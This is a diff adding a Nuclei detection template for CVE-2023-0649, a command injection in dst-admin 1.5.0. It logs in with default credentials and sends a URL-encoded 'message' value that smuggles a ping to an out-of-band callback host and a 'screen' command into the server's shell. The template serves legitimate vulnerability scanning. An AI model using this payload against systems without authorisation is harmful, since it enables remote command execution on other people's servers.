@@ -1,0 +1,51 @@
+id: cve-2023-0649
+info:
+  name: dst-admin sendBroadcast RCE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    dst-admin 1.5.0 contains a command injection vulnerability in the `home/sendBroadcast` endpoint. This vulnerability allows attackers to execute arbitrary commands via the `message` parameter.
+  reference:
+    - https://github.com/Ha0Liu/cveAdd/blob/developer/dst-admin%201.5.0%E5%90%8E%E5%8F%B0sendBroadcast%E6%8E%A5%E5%8F%A3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Dst-admin%201.5.0%20background%20sendBroadcast%20interface%20remote%20command%20execution.md
+  classification:
+    cve-id: CVE-2023-0649
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 7.5
+  metadata:
+    tags: command-injection, rce, java
+
+variables:
+  random_value: "{{rand_base(4)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: login
+    method: POST
+    path:
+      - "{{BaseURL}}/login"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "username=admin&password=123456"
+    matchers:
+      - type: word
+        words:
+          - "登陆成功"
+        part: body
+
+  - id: execute-command
+    method: GET
+    path:
+      - "{{BaseURL}}/home/sendBroadcast?message=%5C%22)%5Cn%22%26ping%20{{interactsh-url}}%26screen%20-S%20%22DST_CAVES%22%20-p%200%20-X%20stuff%20%22TheNet%3AKick(%5C%22"
+    headers:
+      Cookie: "{{login.response.cookies}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
